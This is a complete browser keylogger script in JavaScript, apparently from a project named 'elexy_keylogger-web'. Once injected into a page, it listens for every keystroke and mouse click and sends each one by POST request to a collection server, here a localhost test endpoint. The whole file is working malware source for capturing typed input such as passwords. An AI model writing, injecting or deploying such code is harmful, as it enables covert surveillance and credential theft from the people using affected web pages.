(function(){
var server = "http://127.0.0.1/elexy_keylogger-web/test.php";
document.addEventListener("keyup", function(e){
	var x = new XMLHttpRequest();
	x.open("POST", server, true);
	x.send(e.key);
			});
	document.addEventListener("click", function(e){
		var click;
		if(e.which == 1){
			click = " Left click ";
		}else{
			click = " Right click ";
		}
		var x = new XMLHttpRequest();
		x.open("POST",server,true);
		x.send(click);
			});
	})();